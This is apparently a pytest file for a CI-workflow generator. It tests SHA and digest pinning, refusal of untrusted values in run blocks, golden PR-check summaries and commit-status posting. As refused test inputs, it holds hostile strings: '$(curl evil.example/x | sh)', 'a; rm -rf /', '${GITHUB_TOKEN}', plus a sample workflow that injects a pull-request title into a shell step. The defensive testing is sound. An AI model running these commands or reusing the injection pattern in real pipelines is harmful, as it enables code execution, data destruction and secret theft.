"""The CI surface: pinned workflow generation, the PR-check summary, and the
commit-status seam (docs/v1.1.0/16_CI_GITOPS_INTEGRATIONS.md, Phase 3).

The properties here are all *negative*, and each one is a thing that would be
invisible in a passing workflow file:

* **A floating action ref and an unpinned image are refused.** ``@v4`` and
  ``mayhem:2.4`` are the two ways a gate changes definition between the run that
  passed and the run that failed, so both constructors refuse them and the
  rendered artifact is asserted to carry a 40-hex SHA and a ``sha256:`` digest.
* **No untrusted value is interpolated into a script.** Two independent controls:
  the constructor refuses a value carrying shell or expression syntax, and
  :func:`~mayhem.controller.ci_surface.assert_script_containment` scans the
  rendered ``run:`` blocks for a ``${{`` that slipped through. The second is the
  one with a *negative control* below: the scan is handed a hand-written workflow
  containing exactly the injection this module exists to prevent, and must
  refuse it.
* **The summary is a golden.** The markdown a reviewer reads on the pull request
  is compared byte-for-byte against a fixture, because "PR-check output is
  golden-tested" is the plan's acceptance criterion and an eyeball check is not a
  test. Two goldens: all-passing, and unreachable (every check ``UNKNOWN``).
* **An unposted status is never a posted one.** Four ways to have no answer from
  the port — unbound, raising, answering ``None``, answering in a wrong shape —
  and all four produce ``published=False`` with the control plane marked
  unreachable. ``error`` is the state an ``UNKNOWN`` check maps to, never
  ``success`` and never ``neutral``.
"""

from __future__ import annotations

import re
from datetime import UTC, datetime

import pytest

from mayhem.controller.check_gate import CoverageSurface
from mayhem.controller.ci_surface import (
    CHECKOUT_ACTION,
    ActionPin,
    CommitStatus,
    ImagePin,
    Provider,
    StatusAck,
    WorkflowSpec,
    assert_script_containment,
    publish_commit_status,
    render_check_summary,
    render_github_workflow,
    render_gitlab_component,
    status_for,
)
from mayhem.domain.coverage import CoverageCell
from mayhem.domain.errors import InvariantViolationError
from mayhem.domain.pipeline import (
    ChangeLink,
    CheckFinding,
    CheckOutcome,
    CheckScope,
    ControlPlaneReach,
    FindingSeverity,
    PipelinePins,
    PipelineVerdict,
    PRCheck,
)

SHA = "0123456789abcdef0123456789abcdef01234567"
IMAGE = "ghcr.io/mayhemlabs/mayhem@sha256:" + "a" * 64
NOW = datetime(2026, 10, 3, 9, 0, tzinfo=UTC)
GIT_SHA = "0123456789abcdef0123456789abcdef01234567"


def _pins(**overrides: str) -> PipelinePins:
    base = {
        "plan_version": "4.2.0",
        "policy_version": "9",
        "catalog_version": "2.4.0",
        "agent_version": "0.9.0",
        "runtime_version": "1.11.0",
    }
    base.update(overrides)
    return PipelinePins(**base)


def _change(**overrides: object) -> ChangeLink:
    fields: dict[str, object] = {
        "git_sha": GIT_SHA,
        "change_ticket": "MAYHEM-4712",
        "deployment_id": "deploy-9931",
        "pins": _pins(),
        "linked_at": NOW,
    }
    fields.update(overrides)
    return ChangeLink(**fields)  # type: ignore[arg-type]


GITLAB_INPUTS: tuple[tuple[str, str], ...] = (
    ("plan_ref", "$[[ inputs.plan_ref ]]"),
    ("ticket", "$[[ inputs.ticket ]]"),
)


def _spec(**overrides: object) -> WorkflowSpec:
    fields: dict[str, object] = {
        "name": "mayhem-checks",
        "provider": Provider.GITHUB,
        "image": ImagePin(IMAGE),
        "actions": (CHECKOUT_ACTION,),
        "checks": (CheckScope.SYNTAX, CheckScope.BLAST_RADIUS),
        "untrusted_inputs": (
            ("plan_ref", "${{ github.event.pull_request.head.ref }}"),
            ("ticket", "${{ github.event.pull_request.number }}"),
        ),
        "release_gate": True,
    }
    fields.update(overrides)
    return WorkflowSpec(**fields)  # type: ignore[arg-type]


# ── pins ──────────────────────────────────────────────────────────────────────


class TestPinning:
    def test_an_action_pin_renders_owner_name_at_sha(self) -> None:
        pin = ActionPin(owner="actions", name="checkout", sha=SHA)
        assert pin.ref == f"actions/checkout@{SHA}"

    @pytest.mark.parametrize(
        "sha",
        ["v4", "main", "v4.1.1", SHA[:12], SHA.upper(), ""],
        ids=["tag", "branch", "version-tag", "short-sha", "uppercase", "blank"],
    )
    def test_a_floating_action_ref_is_refused(self, sha: str) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            ActionPin(owner="actions", name="checkout", sha=sha)
        assert excinfo.value.rule == "ci_surface.floating_action_ref"
        assert "40-character commit SHA" in str(excinfo.value)

    def test_the_refusal_names_what_was_asked_for(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            ActionPin(owner="actions", name="checkout", sha="v4")
        assert "actions/checkout" in str(excinfo.value)

    @pytest.mark.parametrize(
        "image",
        [
            "ghcr.io/mayhemlabs/mayhem:2.4",
            "ghcr.io/mayhemlabs/mayhem:latest",
            "ghcr.io/mayhemlabs/mayhem",
            "ghcr.io/mayhemlabs/mayhem@sha256:" + "a" * 63,
            "ghcr.io/mayhemlabs/mayhem@" + "A" * 64,
        ],
        ids=["tag", "latest", "bare", "short-digest", "uppercase-digest"],
    )
    def test_an_unpinned_image_is_refused(self, image: str) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            ImagePin(image=image)
        assert excinfo.value.rule == "ci_surface.floating_image_ref"

    def test_a_pinned_image_is_accepted(self) -> None:
        assert ImagePin(image=IMAGE).ref == IMAGE

    def test_the_shipped_checkout_pin_is_a_full_sha(self) -> None:
        assert re.fullmatch(r"actions/checkout@[0-9a-f]{40}", CHECKOUT_ACTION.ref)


# ── workflow generation ───────────────────────────────────────────────────────


class TestWorkflowGeneration:
    def test_the_rendered_workflow_pins_every_action(self) -> None:
        rendered = render_github_workflow(_spec())
        for line in rendered.splitlines():
            if line.strip().startswith("uses:"):
                assert re.search(r"uses: \S+@[0-9a-f]{40}$", line.strip()), line

    def test_the_rendered_workflow_pins_the_image_by_digest(self) -> None:
        rendered = render_github_workflow(_spec())
        assert f"MAYHEM_IMAGE: {IMAGE}" in rendered
        assert "mayhem:2.4" not in rendered

    def test_generation_is_deterministic(self) -> None:
        spec = _spec()
        assert render_github_workflow(spec) == render_github_workflow(spec)

    def test_the_workflow_states_least_privilege(self) -> None:
        rendered = render_github_workflow(_spec())
        assert "permissions:" in rendered
        assert "  contents: read" in rendered
        assert "id-token" not in rendered.replace("no id-token", "")

    def test_the_workflow_does_not_persist_credentials(self) -> None:
        assert "persist-credentials: false" in render_github_workflow(_spec())

    def test_untrusted_inputs_arrive_through_env(self) -> None:
        rendered = render_github_workflow(_spec())
        assert "          MAYHEM_PLAN_REF: ${{ github.event.pull_request.head.ref }}" in rendered
        assert "          MAYHEM_TICKET: ${{ github.event.pull_request.number }}" in rendered

    def test_no_run_block_contains_an_expression(self) -> None:
        rendered = render_github_workflow(_spec())
        run_lines = [
            line
            for line in rendered.splitlines()
            if line.strip().startswith("run:") or "mayhem ci check" in line
        ]
        assert run_lines, "the generated workflow runs something"
        assert all("${{" not in line for line in run_lines)

    def test_the_gitlab_component_carries_the_pinned_image_default(self) -> None:
        spec = _spec(provider=Provider.GITLAB, untrusted_inputs=GITLAB_INPUTS)
        rendered = render_gitlab_component(spec)
        assert f"default: {IMAGE}" in rendered
        assert "merge_request_event" in rendered
        assert "MAYHEM_PLAN_REF: $[[ inputs.plan_ref ]]" in rendered
        assert '${{' not in rendered

    def test_a_github_expression_in_a_gitlab_component_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            _spec(provider=Provider.GITLAB)
        assert excinfo.value.rule == "ci_surface.untrusted_value_in_script"
        assert "gitlab expression" in str(excinfo.value)

    def test_rendering_the_wrong_provider_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            render_gitlab_component(_spec(provider=Provider.GITHUB))
        assert "gitlab" in str(excinfo.value)

    @pytest.mark.parametrize(
        "expression",
        [
            "$(curl evil.example/x | sh)",
            "`id`",
            "a; rm -rf /",
            "a\nb",
            "${GITHUB_TOKEN}",
            "'quoted'",
            'double"quoted',
        ],
        ids=["subshell", "backtick", "semicolon", "newline", "expansion", "single", "double"],
    )
    def test_an_untrusted_value_carrying_shell_syntax_is_refused(
        self, expression: str
    ) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            _spec(untrusted_inputs=(("plan_ref", expression),))
        assert excinfo.value.rule == "ci_surface.untrusted_value_in_script"

    def test_an_ordinary_forge_expression_is_accepted(self) -> None:
        spec = _spec(untrusted_inputs=(("branch", "${{ github.head_ref }}"),))
        assert spec.bound_inputs() == (("MAYHEM_BRANCH", "${{ github.head_ref }}"),)

    def test_a_literal_is_not_an_expression_and_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError):
            _spec(untrusted_inputs=(("branch", "main"),))

    def test_a_spec_with_no_actions_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            _spec(actions=())
        assert excinfo.value.rule == "ci_surface.floating_action_ref"


class TestScriptContainment:
    """The backstop. Each case is an artifact a person could paste into a repo."""

    def test_a_hand_written_injection_is_refused(self) -> None:
        hostile = "\n".join(
            [
                "name: pwn",
                "jobs:",
                "  x:",
                "    steps:",
                "      - run: echo ${{ github.event.pull_request.title }}",
                "",
            ]
        )
        with pytest.raises(InvariantViolationError) as excinfo:
            assert_script_containment(hostile)
        assert excinfo.value.rule == "ci_surface.untrusted_value_in_script"

    def test_an_expression_outside_a_run_block_is_allowed(self) -> None:
        benign = "\n".join(
            [
                "name: pwn",
                "jobs:",
                "  x:",
                "    env:",
                "      TITLE: ${{ github.event.pull_request.title }}",
                "    steps:",
                '      - run: echo "$TITLE"',
                "",
            ]
        )
        assert_script_containment(benign)

    def test_the_generated_workflow_passes_its_own_check(self) -> None:
        assert_script_containment(render_github_workflow(_spec()))


# ── the PR-check summary ──────────────────────────────────────────────────────


def _pass_check(name: str = "syntax", scope: CheckScope = CheckScope.SYNTAX) -> PRCheck:
    return PRCheck(
        name=name,
        scope=scope,
        outcome=CheckOutcome.PASS,
        evidence_refs=("gate-output/blast-radius",),
        detail="3 of 3 proof lines pass for plan 4f2a1c0d9e11",
        observed_at=NOW,
    )


def _unknown_check(scope: CheckScope) -> PRCheck:
    return PRCheck(
        name=f"unknown-{scope.value}",
        scope=scope,
        outcome=CheckOutcome.UNKNOWN,
        control_plane=ControlPlaneReach.UNREACHABLE,
        detail="the control plane was unreachable, so no outcome was established",
        observed_at=NOW,
    )


PASSING_GOLDEN = """## mayhem checks — 0123456789abcdef0123456789abcdef01234567

**Pipeline:** PASS
**Change:** ticket:MAYHEM-4712
**Change:** deployment:deploy-9931

| check | scope | outcome | detail |
| --- | --- | --- | --- |
| `syntax` | syntax | **PASS** | 3 of 3 proof lines pass for plan 4f2a1c0d9e11 |
| `blast-radius` | blast_radius | **PASS** | 3 of 3 proof lines pass for plan 4f2a1c0d9e11 |

### Coverage
- checkout: 1 of 2 declared resilience cells covered
  - gaps: `checkout/postgres_failure/container/default`

### Release gate
may this open a release: **no**
- no run is cited, and a run that cannot be cited cannot back a release-gate decision
"""


def _coverage() -> tuple[CoverageSurface, ...]:
    postgres = CoverageCell(
        target="checkout", fault_kind="postgres_failure", execution_context="container",
        parameter_band="default",
    )
    latency = CoverageCell(
        target="checkout", fault_kind="http_timeout", execution_context="container",
        parameter_band="default",
    )
    surface = CoverageSurface(
        service="checkout",
        cells=(postgres, latency),
        covered=frozenset({latency.key}),
    )
    return (surface,)


class TestSummaryGolden:
    def test_the_passing_summary_is_byte_identical_to_the_golden(self) -> None:
        checks = (
            _pass_check(),
            _pass_check("blast-radius", CheckScope.BLAST_RADIUS),
        )
        verdict = PipelineVerdict(
            outcome="pass",
            change=_change(),
            evidence_refs=("gate-output/blast-radius",),
            checks=checks,
            decided_at=NOW,
        )
        assert render_check_summary(verdict, coverage=_coverage()) == PASSING_GOLDEN

    def test_an_unreachable_summary_renders_unknown_never_a_tick(self) -> None:
        verdict = PipelineVerdict(
            outcome="fail",
            change=_change(),
            evidence_refs=("port/control-plane",),
            checks=(
                _unknown_check(CheckScope.SYNTAX),
                _unknown_check(CheckScope.BLAST_RADIUS),
            ),
            reasons=("the control plane was unreachable",),
            decided_at=NOW,
        )
        rendered = render_check_summary(verdict)
        assert rendered.count("**UNKNOWN**") == 2
        assert "**PASS**" not in rendered
        assert "a check that could not ask the question reports unknown" in rendered

    def test_a_summary_of_no_checks_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            render_check_summary(
                PipelineVerdict(
                    outcome="fail",
                    change=_change(),
                    evidence_refs=("port/control-plane",),
                    reasons=("something",),
                    decided_at=NOW,
                )
            )
        assert excinfo.value.rule == "ci_surface.summary_without_verdict"

    def test_every_coverage_line_carries_its_denominator(self) -> None:
        verdict = PipelineVerdict(
            outcome="pass",
            change=_change(),
            evidence_refs=("gate-output/blast-radius",),
            checks=(_pass_check(),),
            decided_at=NOW,
        )
        rendered = render_check_summary(verdict, coverage=_coverage())
        assert "1 of 2 declared resilience cells covered" in rendered
        assert "50%" not in rendered

    def test_unpinned_axes_are_named_in_the_summary(self) -> None:
        verdict = PipelineVerdict(
            outcome="pass",
            change=_change(pins=_pins(policy_version="")),
            evidence_refs=("gate-output/blast-radius",),
            checks=(_pass_check(),),
            decided_at=NOW,
        )
        assert "**Unpinned axes:** policy_version" in render_check_summary(verdict)

    def test_a_finding_message_reaches_the_table(self) -> None:
        failing = PRCheck(
            name="safety-policy",
            scope=CheckScope.SAFETY_POLICY,
            outcome=CheckOutcome.FAIL,
            evidence_refs=("proof/required-approvals",),
            finding=CheckFinding(
                code="check.safety-policy.refused",
                message="compensation: the plan declares no undo op",
                severity=FindingSeverity.ERROR,
            ),
            observed_at=NOW,
        )
        verdict = PipelineVerdict(
            outcome="fail",
            change=_change(),
            evidence_refs=("proof/required-approvals",),
            checks=(failing,),
            reasons=("safety-policy reported fail",),
            decided_at=NOW,
        )
        assert "compensation: the plan declares no undo op" in render_check_summary(verdict)


# ── commit statuses ───────────────────────────────────────────────────────────


class _GoodPort:
    def __init__(self) -> None:
        self.calls: list[tuple[str, CommitStatus]] = []

    def post_status(self, *, git_sha: str, status: CommitStatus) -> object:
        self.calls.append((git_sha, status))
        return StatusAck(context=status.context)


class _RaisingPort:
    def post_status(self, *, git_sha: str, status: CommitStatus) -> object:
        raise TimeoutError("connection refused")


class _NonePort:
    def post_status(self, *, git_sha: str, status: CommitStatus) -> object:
        return None


class _WrongShapePort:
    def post_status(self, *, git_sha: str, status: CommitStatus) -> object:
        return {"unexpected": "shape"}


class TestCommitStatus:
    def _verdict(self, checks: tuple[PRCheck, ...], outcome: str = "pass") -> PipelineVerdict:
        return PipelineVerdict(
            outcome=outcome,
            change=_change(),
            evidence_refs=("gate-output/blast-radius",),
            checks=checks,
            reasons=() if outcome == "pass" else ("safety-policy reported fail",),
            decided_at=NOW,
        )

    def test_a_passing_verdict_posts_success(self) -> None:
        status = status_for(self._verdict((_pass_check(),)))
        assert status.state == "success"
        assert status.context == "mayhem/ci"

    def test_an_unknown_check_posts_error_never_success_or_neutral(self) -> None:
        status = status_for(
            self._verdict((_pass_check(), _unknown_check(CheckScope.SYNTAX)), outcome="fail")
        )
        assert status.state == "error"
        assert "could not conclude" in status.description

    def test_neutral_is_not_an_acceptable_state(self) -> None:
        with pytest.raises(InvariantViolationError) as excinfo:
            CommitStatus(context="mayhem/ci", state="neutral", description="hmm")
        assert excinfo.value.rule == "ci_surface.status_unavailable"

    def test_an_over_long_description_is_refused(self) -> None:
        with pytest.raises(InvariantViolationError):
            CommitStatus(context="mayhem/ci", state="success", description="x" * 141)

    def test_a_good_port_receives_the_status(self) -> None:
        port = _GoodPort()
        publication = publish_commit_status(
            port, git_sha=GIT_SHA, status=status_for(self._verdict((_pass_check(),)))
        )
        assert publication.published is True
        assert publication.reach is ControlPlaneReach.REACHABLE
        assert port.calls[0][0] == GIT_SHA

    @pytest.mark.parametrize(
        "port",
        [None, _RaisingPort(), _NonePort(), _WrongShapePort()],
        ids=["unbound", "raised", "answered-none", "wrong-shape"],
    )
    def test_four_ways_to_have_no_answer_all_report_unavailable(
        self, port: object
    ) -> None:
        publication = publish_commit_status(
            port, git_sha=GIT_SHA, status=status_for(self._verdict((_pass_check(),)))
        )
        assert publication.published is False
        assert publication.reach is ControlPlaneReach.UNREACHABLE
        assert publication.detail.strip()

    def test_an_unreachable_port_never_reports_a_published_status(self) -> None:
        publication = publish_commit_status(
            None, git_sha=GIT_SHA, status=status_for(self._verdict((_pass_check(),)))
        )
        assert "no commit-status port is bound" in publication.detail
